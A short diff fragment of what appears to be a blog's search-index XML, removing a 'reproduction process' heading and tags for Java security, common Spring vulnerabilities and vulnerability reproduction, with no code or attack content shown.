-<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3>]]></content>
-      <tags>
-        <tag>-Java安全</tag>
-        <tag>-常见的Spring漏洞</tag>
-        <tag>-漏洞复现</tag>
       </tags>
   </entry>
 </search>
